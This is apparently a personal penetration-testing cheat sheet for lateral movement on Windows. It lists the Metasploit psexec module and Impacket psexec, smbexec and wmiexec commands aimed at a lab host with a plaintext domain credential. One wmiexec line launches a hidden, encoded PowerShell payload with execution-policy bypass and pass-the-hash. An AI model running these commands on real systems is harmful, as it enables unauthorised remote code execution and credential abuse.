# PSExec

## MSFConsole

`exploit/windows/smb/psexec`

## PSExec.py

`psexec.py lab.justin-p.me/dwalker:StrongPass1@10.11.12.101`

## alternatives

### smbexec

`smbexec.py lab.justin-p.me/dwalker:StrongPass1@10.11.12.101`

### wmiexec

#### 1

`wmiexec.py lab.justin-p.me/dwalker:StrongPass1@10.11.12.101`

#### 2

`wmiexec.py lab.justin-p.me/dwalker@10.11.12.101 'powershell -exec bypass -Noninteractive -windowstyle hidden -e 'PAYLOAD' -hashes a:hash`
